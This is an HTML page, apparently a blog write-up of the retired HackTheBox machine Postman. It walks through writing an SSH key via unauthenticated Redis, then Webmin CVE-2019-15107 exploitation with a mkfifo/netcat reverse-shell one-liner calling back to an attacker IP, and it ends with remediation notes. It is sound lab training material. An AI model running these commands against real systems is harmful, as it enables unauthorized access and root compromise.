@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HTB Postman: unauthenticated Redis to SSH, Webmin RCE to root — Lucky Thandel</title>
+<meta name="description" content="Redis with no password becomes an SSH key drop (CVE-free), then Webmin 1.910 password-reset RCE (CVE-2019-15107) finishes as root. By Lucky Thandel.">
+<link rel="stylesheet" href="../../assets/css/style.css">
+</head>
+<body>
+<canvas id="matrix"></canvas>
+<div class="wrap">
+<nav class="nav">
+  <a class="logo" href="../../">lucky@thandel:~<span class="cursor">▊</span></a>
+  <a class="link" href="../../">./home</a>
+  <a class="link active" href="../">./articles</a>
+  <a class="link" href="../../about/">./about</a>
+  <a class="link" href="../../contact/">./contact</a>
+</nav>
+
+<div class="meta">2026-10-17 · retired-machine · by Lucky Thandel</div>
+<h1>HTB Postman: unauthenticated Redis to SSH, Webmin RCE to root</h1>
+<div><span class="tag">retired-machine</span><span class="tag">easy</span></div>
+
+<div class="article-body">
+<p>Postman is a retired HackTheBox easy Linux machine teaching two service-hardening lessons back to back. Synopsis: Redis with no password becomes an SSH key drop, then Webmin 1.910 password-reset RCE (CVE-2019-15107) finishes as root.</p>
+<h2><span class="amber">$</span> Enumeration — two services, two roads</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># nmap: spot Redis plus Webmin</span>
+nmap -sC -sV -oN postman.nmap 10.10.10.160   # 6379 redis, 22 ssh, 10000 webmin 1.910</pre>
+<p>Redis on 6379, SSH, and Webmin 1.910 on port 10000. Probe Redis auth first — an unauthenticated database is the fastest foothold on the box.</p>
+<h2><span class="amber">$</span> Foothold — Redis key drop (no CVE needed)</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: write your key via Redis</span>
+ssh-keygen -t rsa -f postman_key -N &quot;&quot;
+redis-cli -h 10.10.10.160
+10.10.10.160:6379&gt; CONFIG SET dir /var/lib/redis/.ssh
+10.10.10.160:6379&gt; CONFIG SET dbfilename authorized_keys
+10.10.10.160:6379&gt; SET crackit &quot;\n\nssh-rsa AAAAB3...you@box\n\n&quot;
+10.10.10.160:6379&gt; SAVE
+ssh -i postman_key redis@10.10.10.160</pre>
+<p>Redis lets clients set its directory and dump file — point them at an authorized_keys path, SAVE, and SSH in. No exploit code: just a database doing exactly what it was told.</p>
+<h2><span class="amber">$</span> Privilege escalation — Webmin CVE-2019-15107</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># bash: password-reset RCE to root</span>
+# Webmin 1.910 password_change.cgi RCE (public exploit):
+python3 webmin-15107.py https://10.10.10.160:10000 &quot;id; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.23 4445 &gt;/tmp/f&quot;
+nc -lvnp 4445   # uid=0(root)</pre>
+<p>The password-change endpoint executes commands and Webmin runs privileged — RCE equals root directly. Flag values redacted per HTB rules; earn them in your own lab.</p>
+<h2><span class="amber">$</span> Dead ends</h2>
+<p>Redis command-execution modules first (the key-drop is simpler and quieter — master the primitive) and SSH password guessing (the key path bypasses passwords entirely).</p>
+<h2><span class="amber">$</span> Remediation notes</h2>
+<p>Bind Redis to localhost with requirepass, never expose it, patch Webmin past 1.910, and treat unauthenticated database ports as critical. Written by Lucky Thandel.</p>
+</div>
+
+<div class="byline">Written by <strong>Lucky Thandel</strong> · HTB walkthrough series · retired machines only — no spoilers for active boxes.</div>
+<p><a class="btn" href="../">← $ cd ../articles</a></p>
+
+<footer>
+  <span>© 2026 Lucky Thandel · written by Lucky Thandel</span>
+  <span>session <span id="session-clock">00:00:00</span> · <a href="../../contact/">contact</a></span>
+</footer>
+</div>
+<script src="../../assets/js/terminal.js"></script>
+</body>
+</html>
